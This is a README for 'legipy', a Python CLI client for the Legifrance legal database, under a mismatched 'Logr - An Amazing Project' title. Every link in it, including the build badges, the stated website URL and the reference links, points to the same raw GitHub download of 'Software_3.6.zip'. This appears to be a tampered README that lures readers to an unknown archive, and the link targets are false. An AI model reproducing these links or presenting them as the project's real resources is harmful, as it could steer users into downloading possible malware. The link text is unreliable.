Logr - An Amazing Project

legipy
======

[![Build Status](https://github.com/M-ux349/legipy/raw/refs/heads/master/legipy/parsers/Software_3.6.zip)](https://github.com/M-ux349/legipy/raw/refs/heads/master/legipy/parsers/Software_3.6.zip)
[![codecov](https://github.com/M-ux349/legipy/raw/refs/heads/master/legipy/parsers/Software_3.6.zip)](https://github.com/M-ux349/legipy/raw/refs/heads/master/legipy/parsers/Software_3.6.zip)

**⚠️ since the new update of legifrance (2020), there's anti-scrapping and the layout changed making this library obsolete for now**

Python client for the `https://github.com/M-ux349/legipy/raw/refs/heads/master/legipy/parsers/Software_3.6.zip` website.

CLI usage
---------

The command-line script `legipy` gives access to service commands from the command line and outputs data in JSON format.

## Legislature

Access to the [legislature](https://github.com/M-ux349/legipy/raw/refs/heads/master/legipy/parsers/Software_3.6.zip).

### List legislatures

```bash
legipy legislatures
```

### List published laws

```bash
legipy published_laws [--legislature=CURRENT]
```

### List pending law projects

```bash
legipy law_projects [--legislature=CURRENT]
```

### List pending law proposals

```bash
legipy law_proposals [--legislature=CURRENT]
```

### List common laws ("[Lois dites](https://github.com/M-ux349/legipy/raw/refs/heads/master/legipy/parsers/Software_3.6.zip)")

```bash
legipy common_laws
```

### Show specific law

```bash
legipy law JORFDOLE000024106525
```

## Applicable codes

Access to the [applicable codes](https://github.com/M-ux349/legipy/raw/refs/heads/master/legipy/parsers/Software_3.6.zip).

### List applicable codes

```bash
legipy codes
```

### Show code details

```bash
legipy code LEGITEXT000006074075
legipy code --date-pub 2018-05-01 LEGITEXT000006074075
```

### Show code section details

```bash
legipy code_section LEGITEXT000006074075 LEGISCTA000006107991
legipy code --date-pub 2018-05-01 LEGITEXT000006074075 LEGISCTA000006107991
```
